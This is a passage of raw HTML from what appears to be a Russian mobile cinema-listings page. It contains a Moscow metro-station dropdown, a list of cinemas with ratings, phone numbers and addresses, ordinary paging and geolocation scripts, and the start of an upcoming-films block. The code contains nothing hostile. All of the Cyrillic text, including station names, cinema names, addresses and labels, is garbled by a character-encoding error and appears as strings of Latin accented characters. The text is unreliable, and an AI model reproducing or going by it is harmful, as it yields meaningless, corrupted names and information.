	<option value="58">ÐÑÐ°ÑÐ½Ð¾Ð³Ð²Ð°ÑÐ´ÐµÐ¹ÑÐºÐ°Ñ</option>
	
	<option value="59">ÐÑÐ°ÑÐ½Ð¾Ð¿ÑÐµÑÐ½ÐµÐ½ÑÐºÐ°Ñ</option>
	
	<option value="60">ÐÑÐ°ÑÐ½Ð¾ÑÐµÐ»ÑÑÐºÐ°Ñ</option>
	
	<option value="61">ÐÑÐ°ÑÐ½ÑÐµ ÐÐ¾ÑÐ¾ÑÐ°</option>
	
	<option value="62">ÐÑÐµÑÑÑÑÐ½ÑÐºÐ°Ñ Ð·Ð°ÑÑÐ°Ð²Ð°</option>
	
	<option value="63">ÐÑÐ¾Ð¿Ð¾ÑÐºÐ¸Ð½ÑÐºÐ°Ñ</option>
	
	<option value="64">ÐÑÑÐ»Ð°ÑÑÐºÐ¾Ðµ</option>
	
	<option value="65">ÐÑÐ·Ð½ÐµÑÐºÐ¸Ð¹ ÐÐ¾ÑÑ</option>
	
	<option value="66">ÐÑÐ·ÑÐ¼Ð¸Ð½ÐºÐ¸</option>
	
	<option value="67">ÐÑÐ½ÑÐµÐ²ÑÐºÐ°Ñ</option>
	
	<option value="280">ÐÑÐ½ÑÐµÐ²ÑÐºÐ°Ñ</option>
	
	<option value="281">ÐÑÑÑÐºÐ°Ñ</option>
	
	<option value="68">ÐÑÑÑÐºÐ°Ñ</option>
	
	<option value="69">ÐÑÑÑÐ·Ð¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="70">ÐÐµÐ½Ð¸Ð½ÑÐºÐ¸Ð¹ Ð¿ÑÐ¾ÑÐ¿ÐµÐºÑ</option>
	
	<option value="121">ÐÐµÑÐ¼Ð¾Ð½ÑÐ¾Ð²ÑÐºÐ¸Ð¹ Ð¿ÑÐ¾ÑÐ¿ÐµÐºÑ</option>
	
	<option value="393">ÐÐµÑÐ¾Ð¿Ð°ÑÐºÐ¾Ð²Ð°Ñ</option>
	
	<option value="71">ÐÐ¸ÑÐ¾Ð±Ð¾ÑÑ</option>
	
	<option value="72">ÐÑÐ±ÑÐ½ÐºÐ°</option>
	
	<option value="73">ÐÑÐ±Ð»Ð¸Ð½Ð¾</option>
	
	<option value="74">ÐÐ°ÑÐºÑÐ¸ÑÑÑÐºÐ°Ñ</option>
	
	<option value="75">ÐÐ°ÑÑÐ¸Ð½Ð° Ð Ð¾ÑÐ°</option>
	
	<option value="76">ÐÐ°ÑÑÐ¸Ð½Ð¾</option>
	
	<option value="77">ÐÐ°ÑÐºÐ¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="78">ÐÐµÐ´Ð²ÐµÐ´ÐºÐ¾Ð²Ð¾</option>
	
	<option value="79">ÐÐµÐ¶Ð´ÑÐ½Ð°ÑÐ¾Ð´Ð½Ð°Ñ</option>
	
	<option value="80">ÐÐµÐ½Ð´ÐµÐ»ÐµÐµÐ²ÑÐºÐ°Ñ</option>
	
	<option value="81">ÐÐ¸ÑÐ¸Ð½Ð¾</option>
	
	<option value="82">ÐÐ¾Ð»Ð¾Ð´ÐµÐ¶Ð½Ð°Ñ</option>
	
	<option value="83">ÐÑÐºÐ¸Ð½Ð¸Ð½Ð¾</option>
	
	<option value="84">ÐÐ°Ð³Ð°ÑÐ¸Ð½ÑÐºÐ°Ñ</option>
	
	<option value="85">ÐÐ°Ð³Ð¾ÑÐ½Ð°Ñ</option>
	
	<option value="86">ÐÐ°ÑÐ¸Ð¼Ð¾Ð²ÑÐºÐ¸Ð¹ Ð¿ÑÐ¾ÑÐ¿ÐµÐºÑ</option>
	
	<option value="87">ÐÐ¸ÐºÑÐ»Ð¸Ð½ÑÐºÐ°Ñ</option>
	
	<option value="88">ÐÐ¾Ð²Ð¾Ð³Ð¸ÑÐµÐµÐ²Ð¾</option>
	
	<option value="89">ÐÐ¾Ð²Ð¾ÐºÐ¾ÑÐ¸Ð½Ð¾</option>
	
	<option value="90">ÐÐ¾Ð²Ð¾ÐºÑÐ·Ð½ÐµÑÐºÐ°Ñ</option>
	
	<option value="91">ÐÐ¾Ð²Ð¾Ð¿ÐµÑÐµÐ´ÐµÐ»ÐºÐ¸Ð½Ð¾</option>
	
	<option value="92">ÐÐ¾Ð²Ð¾ÑÐ»Ð¾Ð±Ð¾Ð´ÑÐºÐ°Ñ</option>
	
	<option value="93">ÐÐ¾Ð²Ð¾ÑÑÐµÐ½ÐµÐ²ÑÐºÐ°Ñ</option>
	
	<option value="94">ÐÐ¾Ð²ÑÐµ Ð§ÐµÑÐµÐ¼ÑÑÐºÐ¸</option>
	
	<option value="282">ÐÐºÑÑÐ±ÑÑÑÐºÐ°Ñ</option>
	
	<option value="95">ÐÐºÑÑÐ±ÑÑÑÐºÐ°Ñ</option>
	
	<option value="96">ÐÐºÑÑÐ±ÑÑÑÐºÐ¾Ðµ ÐÐ¾Ð»Ðµ</option>
	
	<option value="97">ÐÐ»Ð¸Ð¼Ð¿Ð¸Ð¹ÑÐºÐ°Ñ Ð´ÐµÑÐµÐ²Ð½Ñ</option>
	
	<option value="98">ÐÑÐµÑÐ¾Ð²Ð¾</option>
	
	<option value="100">ÐÑÑÐ°Ð´Ð½Ð¾Ðµ</option>
	
	<option value="101">ÐÑÐ¾ÑÐ½ÑÐ¹ Ð ÑÐ´</option>
	
	<option value="283">ÐÐ°Ð²ÐµÐ»ÐµÑÐºÐ°Ñ</option>
	
	<option value="102">ÐÐ°Ð²ÐµÐ»ÐµÑÐºÐ°Ñ</option>
	
	<option value="103">ÐÐ°ÑÐº ÐºÑÐ»ÑÑÑÑÑ</option>
	
	<option value="104">ÐÐ°ÑÐº ÐºÑÐ»ÑÑÑÑÑ</option>
	
	<option value="105">ÐÐ°ÑÐº ÐÐ¾Ð±ÐµÐ´Ñ</option>
	
	<option value="106">ÐÐ°ÑÑÐ¸Ð·Ð°Ð½ÑÐºÐ°Ñ</option>
	
	<option value="107">ÐÐµÑÐ²Ð¾Ð¼Ð°Ð¹ÑÐºÐ°Ñ</option>
	
	<option value="108">ÐÐµÑÐ¾Ð²Ð¾</option>
	
	<option value="109">ÐÐµÑÑÐ¾Ð²ÑÐºÐ¾-Ð Ð°Ð·ÑÐ¼Ð¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="110">ÐÐµÑÐ°ÑÐ½Ð¸ÐºÐ¸</option>
	
	<option value="111">ÐÐ¸Ð¾Ð½ÐµÑÑÐºÐ°Ñ</option>
	
	<option value="112">ÐÐ»Ð°Ð½ÐµÑÐ½Ð°Ñ</option>
	
	<option value="113">ÐÐ»Ð¾ÑÐ°Ð´Ñ ÐÐ»ÑÐ¸ÑÐ°</option>
	
	<option value="114">ÐÐ»Ð¾ÑÐ°Ð´Ñ Ð ÐµÐ²Ð¾Ð»ÑÑÐ¸Ð¸</option>
	
	<option value="116">ÐÐ¾Ð»ÐµÐ¶Ð°ÐµÐ²ÑÐºÐ°Ñ</option>
	
	<option value="117">ÐÐ¾Ð»ÑÐ½ÐºÐ°</option>
	
	<option value="118">ÐÑÐ°Ð¶ÑÐºÐ°Ñ</option>
	
	<option value="119">ÐÑÐµÐ¾Ð±ÑÐ°Ð¶ÐµÐ½ÑÐºÐ°Ñ Ð¿Ð»Ð¾ÑÐ°Ð´Ñ</option>
	
	<option value="120">ÐÑÐ¾Ð»ÐµÑÐ°ÑÑÐºÐ°Ñ</option>
	
	<option value="122">ÐÑÐ¾ÑÐ¿ÐµÐºÑ ÐÐµÑÐ½Ð°Ð´ÑÐºÐ¾Ð³Ð¾</option>
	
	<option value="284">ÐÑÐ¾ÑÐ¿ÐµÐºÑ Ð¼Ð¸ÑÐ°</option>
	
	<option value="123">ÐÑÐ¾ÑÐ¿ÐµÐºÑ Ð¼Ð¸ÑÐ°</option>
	
	<option value="124">ÐÑÐ¾ÑÑÐ¾ÑÐ·Ð½Ð°Ñ</option>
	
	<option value="125">ÐÑÑÐºÐ¸Ð½ÑÐºÐ°Ñ</option>
	
	<option value="355">ÐÑÑÐ½Ð¸ÑÐºÐ¾Ðµ ÑÐ¾ÑÑÐµ</option>
	
	<option value="126">Ð ÐµÑÐ½Ð¾Ð¹ Ð²Ð¾ÐºÐ·Ð°Ð»</option>
	
	<option value="127">Ð Ð¸Ð¶ÑÐºÐ°Ñ</option>
	
	<option value="128">Ð Ð¸Ð¼ÑÐºÐ°Ñ</option>
	
	<option value="129">Ð ÑÐ·Ð°Ð½ÑÐºÐ¸Ð¹ Ð¿ÑÐ¾ÑÐ¿ÐµÐºÑ</option>
	
	<option value="130">Ð¡Ð°Ð²ÐµÐ»Ð¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="131">Ð¡Ð²Ð¸Ð±Ð»Ð¾Ð²Ð¾</option>
	
	<option value="132">Ð¡ÐµÐ²Ð°ÑÑÐ¾Ð¿Ð¾Ð»ÑÑÐºÐ°Ñ</option>
	
	<option value="133">Ð¡ÐµÐ»Ð¸Ð³ÐµÑÑÐºÐ°Ñ</option>
	
	<option value="134">Ð¡ÐµÐ¼ÐµÐ½Ð¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="135">Ð¡ÐµÑÐ¿ÑÑÐ¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="136">Ð¡Ð»Ð°Ð²ÑÐ½ÑÐºÐ¸Ð¹ ÐÑÐ»ÑÐ²Ð°Ñ</option>
	
	<option value="285">Ð¡Ð¼Ð¾Ð»ÐµÐ½ÑÐºÐ°Ñ</option>
	
	<option value="137">Ð¡Ð¼Ð¾Ð»ÐµÐ½ÑÐºÐ°Ñ</option>
	
	<option value="138">Ð¡Ð¾ÐºÐ¾Ð»</option>
	
	<option value="139">Ð¡Ð¾ÐºÐ¾Ð»ÑÐ½Ð¸ÐºÐ¸</option>
	
	<option value="140">Ð¡Ð¾Ð»Ð½ÑÐµÐ²Ð¾</option>
	
	<option value="141">Ð¡Ð¿Ð¾ÑÑÐ¸Ð²Ð½Ð°Ñ</option>
	
	<option value="142">Ð¡ÑÐµÑÐµÐ½ÑÐºÐ¸Ð¹ ÐÑÐ»ÑÐ²Ð°Ñ</option>
	
	<option value="143">Ð¡ÑÑÐ¾Ð³Ð¸Ð½Ð¾</option>
	
	<option value="144">Ð¡ÑÑÐ´ÐµÐ½ÑÐµÑÐºÐ°Ñ</option>
	
	<option value="115">Ð¡ÑÐ²Ð¾ÑÐ¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="145">Ð¡ÑÑÐ°ÑÐµÐ²ÑÐºÐ°Ñ</option>
	
	<option value="146">Ð¡ÑÐ¾Ð´Ð½ÐµÐ½ÑÐºÐ°Ñ</option>
	
	<option value="147">Ð¢Ð°Ð³Ð°Ð½ÑÐºÐ°Ñ</option>
	
	<option value="286">Ð¢Ð°Ð³Ð°Ð½ÑÐºÐ°Ñ</option>
	
	<option value="148">Ð¢Ð²ÐµÑÑÐºÐ°Ñ</option>
	
	<option value="149">Ð¢ÐµÐ°ÑÑÐ°Ð»ÑÐ½Ð°Ñ</option>
	
	<option value="150">Ð¢ÐµÐºÑÑÐ¸Ð»ÑÑÐ¸ÐºÐ¸</option>
	
	<option value="151">Ð¢ÐµÐ¿Ð»ÑÐ¹ Ð¡ÑÐ°Ð½</option>
	
	<option value="152">Ð¢ÐµÑÐµÑÐºÐ¾Ð²Ð¾</option>
	
	<option value="153">Ð¢Ð¸Ð¼Ð¸ÑÑÐ·ÐµÐ²ÑÐºÐ°Ñ</option>
	
	<option value="154">Ð¢ÑÐµÑÑÑÐºÐ¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="287">Ð¢ÑÐµÑÑÑÐºÐ¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="155">Ð¢ÑÑÐ±Ð½Ð°Ñ</option>
	
	<option value="156">Ð¢ÑÐ»ÑÑÐºÐ°Ñ</option>
	
	<option value="157">Ð¢ÑÑÐ³ÐµÐ½ÐµÐ²ÑÐºÐ°Ñ</option>
	
	<option value="158">Ð¢ÑÑÐ¸Ð½ÑÐºÐ°Ñ</option>
	
	<option value="159">Ð£Ð»Ð¸ÑÐ° 1905 Ð³Ð¾Ð´Ð°</option>
	
	<option value="160">Ð£Ð»Ð¸ÑÐ° ÐÐºÐ°Ð´ÐµÐ¼Ð¸ÐºÐ° Ð¯Ð½Ð³ÐµÐ»Ñ</option>
	
	<option value="161">Ð£Ð»Ð¸ÑÐ° ÐÐ¾ÑÑÐ°ÐºÐ¾Ð²Ð°</option>
	
	<option value="162">Ð£Ð»Ð¸ÑÐ° ÐÐ¾Ð´Ð±ÐµÐ»ÑÑÐºÐ¾Ð³Ð¾</option>
	
	<option value="163">Ð£Ð»Ð¸ÑÐ° Ð¡ÐºÐ¾Ð±ÐµÐ»ÐµÐ²ÑÐºÐ°Ñ</option>
	
	<option value="164">Ð£Ð»Ð¸ÑÐ° Ð¡ÑÐ°ÑÐ¾ÐºÐ°ÑÐ°Ð»Ð¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="165">Ð£Ð½Ð¸Ð²ÐµÑÑÐ¸ÑÐµÑ</option>
	
	<option value="166">Ð¤Ð¸Ð»ÐµÐ²ÑÐºÐ¸Ð¹ Ð¿Ð°ÑÐº</option>
	
	<option value="167">Ð¤Ð¸Ð»Ð¸</option>
	
	<option value="99">Ð¤Ð¾Ð½Ð²Ð¸Ð·Ð¸Ð½ÑÐºÐ°Ñ</option>
	
	<option value="168">Ð¤ÑÑÐ½Ð·ÐµÐ½ÑÐºÐ°Ñ</option>
	
	<option value="169">Ð¦Ð°ÑÐ¸ÑÑÐ½Ð¾</option>
	
	<option value="170">Ð¦Ð²ÐµÑÐ½Ð¾Ð¹ Ð±ÑÐ»ÑÐ²Ð°Ñ</option>
	
	<option value="171">Ð§ÐµÑÐºÐ¸Ð·Ð¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="172">Ð§ÐµÑÑÐ°Ð½Ð¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="173">Ð§ÐµÑÐ¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="174">Ð§Ð¸ÑÑÑÐµ Ð¿ÑÑÐ´Ñ</option>
	
	<option value="175">Ð§ÐºÐ°Ð»Ð¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="176">Ð¨Ð°Ð±Ð¾Ð»Ð¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="177">Ð¨Ð¸Ð¿Ð¸Ð»Ð¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="178">Ð¨Ð¾ÑÑÐµ ÐÐ½ÑÑÐ·Ð¸Ð°ÑÑÐ¾Ð²</option>
	
	<option value="179">Ð©ÐµÐ»ÐºÐ¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="180">Ð©ÑÐºÐ¸Ð½ÑÐºÐ°Ñ</option>
	
	<option value="181">ÐÐ»ÐµÐºÑÑÐ¾Ð·Ð°Ð²Ð¾Ð´ÑÐºÐ°Ñ</option>
	
	<option value="182">Ð®Ð±Ð¸Ð»ÐµÐ¹Ð½Ð°Ñ</option>
	
	<option value="183">Ð®Ð³Ð¾-ÐÐ°Ð¿Ð°Ð´Ð½Ð°Ñ</option>
	
	<option value="288">Ð®Ð³Ð¾-ÐÐ°Ð¿Ð°Ð´Ð½Ð°Ñ</option>
	
	<option value="184">Ð®Ð¶Ð½Ð°Ñ</option>
	
	<option value="185">Ð¯ÑÐµÐ½ÐµÐ²Ð¾</option>
	
</select>

					</td>
				</tr>
				
				<tr>
					<td colspan="2">
						<div class="chkbox">
							<label onclick="">
								<input type="checkbox" name="is_3d" id="is_3d" value="1"  class="hidden">
								<i><b></b></i>Ð¢Ð¾Ð»ÑÐºÐ¾ ÑÐµÐ°Ð½ÑÑ Ð² <span class="d3"></span>
							</label>
						</div>
					</td>
				</tr>
				<tr>
					<td colspan="2">
						<i class="bg-sbm w100"><input type="submit" class="sbm w100" value="ÐÐ°Ð¹ÑÐ¸ ÑÐµÐ°Ð½ÑÑ"></i>
					</td>
				</tr>
				</table>
			</form>
		</div>
	


		</div>
		
		<div class="block js-cinema">
			<div class="shd">
				<h2><a>ÐÐ¸Ð½Ð¾ÑÐµÐ°ÑÑÑ</a></h2>
			</div>
			
			<div class="js-pgng" onclick="return {
				baseUrl: '/msk/cinema/places/?async=1',
				itemsTotal: 187
			}">
				<div class="js-pgng_cntr trnstn_animated">
			
		<div class="shd mb3 js-pgng_item">
			<a href="/msk/cinema/places/342728_vremena_goda/" class="b_tch-link">
				
				
				
				<b class="ttl">ÐÑÐµÐ¼ÐµÐ½Ð° Ð³Ð¾Ð´Ð° </b>
				<span class="txt"><i class="st st10"></i><b class="rat">10 <span>(8 Ð³Ð¾Ð»Ð¾ÑÐ¾Ð²)</span></b></span>
					
					<span class="txt">
					<span class="nowrap">+7 (495) 666-21-59</span>, <span class="nowrap">+7 (495) 589-19-19</span>&nbsp;(call-ÑÐµÐ½ÑÑ)
					</span>
				
				<span class="txt">ÐÑÑÑÐ·Ð¾Ð²ÑÐºÐ¸Ð¹ Ð¿Ñ-Ñ, 48 (Ð³Ð°Ð»ÐµÑÐµÑ Â«ÐÑÐµÐ¼ÐµÐ½Ð° Ð³Ð¾Ð´Ð°Â»)</span>
				<span class="txt"><span class="sbw_l">
						<span class="nwr"><i class="sbw sbw70_103"></i>ÐÐ°ÑÐº ÐÐ¾Ð±ÐµÐ´Ñ</span>
					</span></span>
			</a>
			
			
		</div>
	
		<div class="shd mb3 js-pgng_item">
			<a href="/msk/cinema/places/391778_kinotsentr_svetofor_v_lyubertsah/" class="b_tch-link">
				
				
				
				<b class="ttl">Ð¡Ð²ÐµÑÐ¾ÑÐ¾Ñ (ÐÑÐ±ÐµÑÑÑ) </b>
				<span class="txt"><i class="st st10"></i><b class="rat">10 <span>(7 Ð³Ð¾Ð»Ð¾ÑÐ¾Ð²)</span></b></span>
					
					<span class="txt">
					<span class="nowrap">+7 (498) 602-82-74</span>, <span class="nowrap">+7 (498) 602-82-70</span>&nbsp;(Ð°Ð´Ð¼Ð¸Ð½Ð¸ÑÑÑÐ°ÑÐ¸Ñ)
					</span>
				
				<span class="txt">Ð³. ÐÑÐ±ÐµÑÑÑ, ÑÐ». ÐÐ¾Ð±ÑÐ°ÑÐ¸Ð¼Ð¾Ð², 7 (Ð¢Ð¦ Â«Ð¡Ð²ÐµÑÐ¾ÑÐ¾ÑÂ»)</span>
				
			</a>
			
			
		</div>
	
		<div class="shd mb3 js-pgng_item">
			<a href="/msk/cinema/places/342319_formula_kino_praga/" class="b_tch-link">
				
				
				
				<b class="ttl">Ð¤Ð¾ÑÐ¼ÑÐ»Ð° ÐºÐ¸Ð½Ð¾ ÐÑÐ°Ð³Ð° </b>
				<span class="txt"><i class="st st10"></i><b class="rat">10 <span>(7 Ð³Ð¾Ð»Ð¾ÑÐ¾Ð²)</span></b></span>
					
					<span class="txt">
					<span class="nowrap">+7 (495) 795-37-95</span>&nbsp;(Ð°Ð²ÑÐ¾Ð¾ÑÐ²ÐµÑÑÐ¸Ðº), <span class="nowrap">+7 (800) 250-80-25</span>&nbsp;(call-ÑÐµÐ½ÑÑ)
					</span>
				
				<span class="txt">Ð£Ð». ÐÐ¸Ð¶Ð½ÑÑ ÐÐ°ÑÐ»Ð¾Ð²ÐºÐ°, 10</span>
				<span class="txt"><span class="sbw_l">
						<span class="nwr"><i class="sbw sbw70_109"></i>Ð¡Ð°Ð²ÐµÐ»Ð¾Ð²ÑÐºÐ°Ñ</span>
					</span></span>
			</a>
			
			
		</div>
	
		<div class="shd mb3 js-pgng_item">
			<a href="/msk/cinema/places/456687_chas_kino_v_tk_sviblovo/" class="b_tch-link">
				
				
				
				<b class="ttl">Ð§Ð°Ñ ÐÐ¸Ð½Ð¾ (Ð¡Ð²Ð¸Ð±Ð»Ð¾Ð²Ð¾) </b>
				<span class="txt"><i class="st st10"></i><b class="rat">10 <span>(4 Ð³Ð¾Ð»Ð¾ÑÐ°)</span></b></span>
					
					<span class="txt">
					<span class="nowrap">+7 (499) 685-16-51</span>, <span class="nowrap">+7 (495) 685-16-52</span>&nbsp;(Ð°Ð²ÑÐ¾Ð¾ÑÐ²ÐµÑÑÐ¸Ðº)
					</span>
				
				<span class="txt">ÑÐ». Ð¡Ð½ÐµÐ¶Ð½Ð°Ñ, 27 (Ð¢Ð Â«Ð¡Ð²Ð¸Ð±Ð»Ð¾Ð²Ð¾Â»)</span>
				<span class="txt"><span class="sbw_l">
						<span class="nwr"><i class="sbw sbw70_106"></i>Ð¡Ð²Ð¸Ð±Ð»Ð¾Ð²Ð¾</span>
					</span></span>
			</a>
			
			
		</div>
	
		<div class="shd mb3 js-pgng_item">
			<a href="/msk/cinema/places/341749_saljut/" class="b_tch-link">
				
				
				
				<b class="ttl">Ð¡Ð°Ð»ÑÑ </b>
				<span class="txt"><i class="st st10"></i><b class="rat">10 <span>(3 Ð³Ð¾Ð»Ð¾ÑÐ°)</span></b></span>
					
					<span class="txt">
					<span class="nowrap">+7 (495) 125-01-35</span>
					</span>
				
				<span class="txt">Ð£Ð». ÐÐµÐ´ÑÐ¾Ð²Ð°, 14/3</span>
				<span class="txt"><span class="sbw_l">
						<span class="nwr"><i class="sbw sbw70_106"></i>ÐÐºÐ°Ð´ÐµÐ¼Ð¸ÑÐµÑÐºÐ°Ñ</span>
					</span></span>
			</a>
			
			
		</div>
	
		<div class="shd mb3 js-pgng_item">
			<a href="/msk/cinema/places/343009_sputnik/" class="b_tch-link">
				
				
				
				<b class="ttl">Ð¡Ð¿ÑÑÐ½Ð¸Ðº </b>
				<span class="txt"><i class="st st10"></i><b class="rat">10 <span>(2 Ð³Ð¾Ð»Ð¾ÑÐ°)</span></b></span>
					
					<span class="txt">
					<span class="nowrap">+7 (495) 361-29-19</span>, <span class="nowrap">+7 (495) 361-42-20</span>
					</span>
				
				<span class="txt">Ð£Ð». Ð¡Ð¾Ð»Ð´Ð°ÑÑÐºÐ°Ñ, 15</span>
				<span class="txt"><span class="sbw_l">
						<span class="nwr"><i class="sbw sbw70_108"></i>ÐÐ²Ð¸Ð°Ð¼Ð¾ÑÐ¾ÑÐ½Ð°Ñ</span>
					</span></span>
			</a>
			
			
		</div>
	
		<div class="shd mb3 js-pgng_item">
			<a href="/msk/cinema/places/459387_olimpik_sinema/" class="b_tch-link">
				
				
				
				<b class="ttl">ÐÐ»Ð¸Ð¼Ð¿Ð¸Ðº CÐ¸Ð½ÐµÐ¼Ð° </b>
				<span class="txt"><i class="st st10"></i><b class="rat">10 <span>(1 Ð³Ð¾Ð»Ð¾Ñ)</span></b></span>
					
					<span class="txt">
					<span class="nowrap">+7 (495) 647-49-19</span>
					</span>
				
				<span class="txt">Ð£Ð». 5-Ñ ÐÐ°Ð±ÐµÐ»ÑÐ½Ð°Ñ, Ð´Ð¾Ð¼ 2. Ð¢Ð Ð Â«Ð¡Ð¿Ð¾ÑÑEXÂ», 3 ÑÑÐ°Ð¶</span>
				<span class="txt"><span class="sbw_l">
						<span class="nwr"><i class="sbw sbw70_108"></i>ÐÐ²Ð¸Ð°Ð¼Ð¾ÑÐ¾ÑÐ½Ð°Ñ</span>
					</span></span>
			</a>
			
			
		</div>
	
		<div class="shd mb3 js-pgng_item">
			<a href="/msk/cinema/places/347751_cinema_park_deluxe_metropolis/" class="b_tch-link">
				
				
				
				<b class="ttl">Ð¡Ð¸Ð½ÐµÐ¼Ð° ÐÐ°ÑÐº Deluxe (Ð¢Ð¦ Â«ÐÐµÑÑÐ¾Ð¿Ð¾Ð»Ð¸ÑÂ») </b>
				<span class="txt"><i class="st st9_5"></i><b class="rat">9.9 <span>(48 Ð³Ð¾Ð»Ð¾ÑÐ¾Ð²)</span></b></span>
					
					<span class="txt">
					<span class="nowrap">+7 (495) 789-96-85</span>, <span class="nowrap">+7 (495) 644-41-11</span>&nbsp;(Ð°Ð´Ð¼Ð¸Ð½Ð¸ÑÑÑÐ°ÑÐ¸Ñ)
					</span>
				
				<span class="txt">ÐÐµÐ½Ð¸Ð½Ð³ÑÐ°Ð´ÑÐºÐ¾Ðµ Ñ., 16Ð, ÑÑÑ. 4 (Ð¢Ð¦ Â«ÐÐµÑÑÐ¾Ð¿Ð¾Ð»Ð¸ÑÂ»)</span>
				<span class="txt"><span class="sbw_l">
						<span class="nwr"><i class="sbw sbw70_102"></i>ÐÐ¾Ð¹ÐºÐ¾Ð²ÑÐºÐ°Ñ</span>
					</span></span>
			</a>
			
			
		</div>
	
		<div class="shd mb3 js-pgng_item">
			<a href="/msk/cinema/places/341967_karo_film_na_vernadskogo/" class="b_tch-link">
				
				
				
				<b class="ttl">ÐÐ°ÑÐ¾ Ð¤Ð¸Ð»ÑÐ¼ Ð½Ð° ÐÐµÑÐ½Ð°Ð´ÑÐºÐ¾Ð³Ð¾ </b>
				<span class="txt"><i class="st st9_5"></i><b class="rat">9.88 <span>(8 Ð³Ð¾Ð»Ð¾ÑÐ¾Ð²)</span></b></span>
					
					<span class="txt">
					<span class="nowrap">+7 (495) 545-05-05</span>&nbsp;(call-ÑÐµÐ½ÑÑ)
					</span>
				
				<span class="txt">ÐÑ-Ñ ÐÐµÑÐ½Ð°Ð´ÑÐºÐ¾Ð³Ð¾, 6 (Ð¢Ð¦ Â«ÐÐ°Ð¿Ð¸ÑÐ¾Ð»Ð¸Ð¹ ÐÐµÑÐ½Ð°Ð´ÑÐºÐ¾Ð³Ð¾Â»)</span>
				<span class="txt"><span class="sbw_l">
						<span class="nwr"><i class="sbw sbw70_101"></i>Ð£Ð½Ð¸Ð²ÐµÑÑÐ¸ÑÐµÑ</span>
					</span></span>
			</a>
			
			
		</div>
	
		<div class="shd mb3 js-pgng_item">
			<a href="/msk/cinema/places/342443_kinostar_de_luxe/" class="b_tch-link">
				
				
				
				<b class="ttl">Kinostar De Luxe (Â«ÐÐÐÐ Ð¢ÐµÐ¿Ð»ÑÐ¹ ÑÑÐ°Ð½Â») </b>
				<span class="txt"><i class="st st9_5"></i><b class="rat">9.83 <span>(46 Ð³Ð¾Ð»Ð¾ÑÐ¾Ð²)</span></b></span>
					
					<span class="txt">
					<span class="nowrap">+7 (495) 644-41-11</span>, <span class="nowrap">+7 (495) 775-44-77</span>&nbsp;(Ð°Ð²ÑÐ¾Ð¾ÑÐ²ÐµÑÑÐ¸Ðº), <span class="nowrap">+7 (495) 644-41-11</span>&nbsp;(Ð°Ð´Ð¼Ð¸Ð½Ð¸ÑÑÑÐ°ÑÐ¸Ñ)
					</span>
				
				<span class="txt">41-Ð¹ ÐºÐ¼ ÐÐÐÐ (Ð¢Ð¦ Â«ÐÐÐÐ Ð¢ÐµÐ¿Ð»ÑÐ¹ ÑÑÐ°Ð½Â»)</span>
				<span class="txt"><span class="sbw_l">
						<span class="nwr"><i class="sbw sbw70_109"></i>ÐÑÐ»ÑÐ²Ð°Ñ ÐÐ¼Ð¸ÑÑÐ¸Ñ ÐÐ¾Ð½ÑÐºÐ¾Ð³Ð¾ &nbsp;</span>
					
						<span class="nwr"><i class="sbw sbw70_106"></i>Ð¢ÐµÐ¿Ð»ÑÐ¹ Ð¡ÑÐ°Ð½ &nbsp;</span>
					
						<span class="nwr"><i class="sbw sbw70_106"></i>Ð¯ÑÐµÐ½ÐµÐ²Ð¾</span>
					</span></span>
			</a>
			
			
		</div>
	

				</div>
			

	
	<div class="js-tomore shd mb3">
		<h4><a href="?page=2" class="js-tomore_lnk">ÐµÑÑ</a></h4>
	</div>
	


			</div>
		</div>
		<script type="text/javascript" src="/js/touch/paging/fj.prPaging.js?1400835529"></script>
<script type="text/javascript" src="/js/touch/paging/fj.prPgngInit.js?1400835529"></script>
<script type="text/javascript" src="/js/touch/geoloc/fj.getListByLoc.js?1400835529"></script>
<script type="text/javascript" src="/js/touch/fj.Tabs.js?1400835529"></script>
<script type="text/javascript">(function ($) {
	var jBlock = $('.js-cinema_now');
	var sNearSel = '.js-near_cont';
	var sGeoFail = 'loader_no_geo';
	//var sNearContSel = '.js-geo_cont';
	var bNearInited = false;
	var oTabs;
	if (jBlock.length) {
		oTabs = jBlock.makeTabs({fOnSwtch: function (jBtn, jTab) {
			if (jTab.is(sNearSel) && !bNearInited) {
				jTab.getGeoList({
					onFail: function () {
						jTab.addClass(sGeoFail);
					},
					fainContCls: 'near_movies_fail',
					pgngItemsCnt: 3
				});
				bNearInited = true;
			}
		}});
	}
})(window.$f);</script>

		<script type="text/javascript">(function ($, window) {
	$('.js-near_cinemas').getGeoList({
		onSuccess: function(isSuccess) {
			$('.js-cinema_now').removeClass('hidden');
			$('.js-cinema').addClass('hidden');
		}
	});
})(window.$f, window);</script>
		



		
		<div class="block">
			<div class="shd">
				
				<h2><a href="/cinema/soon/"><i>CÐºÐ¾ÑÐ¾ Ð² ÐºÐ¸Ð½Ð¾</i></a></h2>
				
			</div>
				
					<div class="shd mb3">
						<a href="/cinema/movies/720192_planeta_obezyan_revolyutsiya/" class="b_tch-link-img">
							<span class="date"><b class="d">17</b><b class="m">ÐÑÐ»</b></span>
							<img src="http://pic.afisha.mail.ru/2791783/" alt="">
							<b class="ttl">ÐÐ»Ð°Ð½ÐµÑÐ° Ð¾Ð±ÐµÐ·ÑÑÐ½: Ð ÐµÐ²Ð¾Ð»ÑÑÐ¸Ñ</b>
							<span class="txt">Ð´ÑÐ°Ð¼Ð° &#8226; ÑÑÐ¸Ð»Ð»ÐµÑ &#8226; Ð±Ð¾ÐµÐ²Ð¸Ðº &#8226; ÑÐ°Ð½ÑÐ°ÑÑÐ¸ÐºÐ°</span>
						</a>
					</div>
				
					<div class="shd mb3">
						<a href="/cinema/movies/771844_gerakl/" class="b_tch-link-img">
							<span class="date"><b class="d">24</b><b class="m">ÐÑÐ»</b></span>
